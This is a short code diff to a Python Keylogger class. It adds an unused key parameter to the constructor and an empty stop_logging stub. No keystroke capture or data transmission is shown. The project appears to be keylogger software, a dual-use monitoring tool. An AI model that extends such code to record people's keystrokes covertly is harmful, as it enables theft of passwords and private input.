@@ -32,13 +32,16 @@ class Keylogger:
             return False
         return True
 
-    def __init__(self, buffer: Buffer):
+    def __init__(self, buffer: Buffer, key:str):
         """
         Initialize an Instance with given Buffer
         :param buffer: Object of the Buffer class
         """
         self.__pressed_keys = []
         self.__buffer = buffer
+
+    def stop_logging(self):
+        pass
 
     def start_logging(self) -> None:
         """
